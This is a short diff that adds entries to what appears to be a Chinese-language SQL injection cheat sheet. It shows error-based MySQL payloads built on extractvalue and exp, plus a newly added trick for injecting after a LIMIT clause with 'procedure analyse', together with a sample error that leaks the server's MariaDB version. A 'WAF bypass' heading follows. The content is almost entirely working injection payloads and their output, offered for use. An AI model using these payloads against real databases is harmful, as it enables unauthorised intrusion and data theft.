@@ -165,6 +165,11 @@ exp(~(select*from(select user())a));  // 內部查詢結果為0, 經過逐位取
 
 and extracvalue(rand(),concat(0x3a,(select schema_name from information_schema.schemata limit 0,1))#
 where table_schema=0xXXXXX
+
+// 奇技淫巧
+// 若注入點在limit後面 e.g. order by name limit {$_GET[1]}, 10
+?1=select id from users where id>5 order by name limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);
+// ERROR 1105 (HY000): XPATH syntax error: ':10.1.26-MariaDB'
 ```
 
 ### WAF bypass
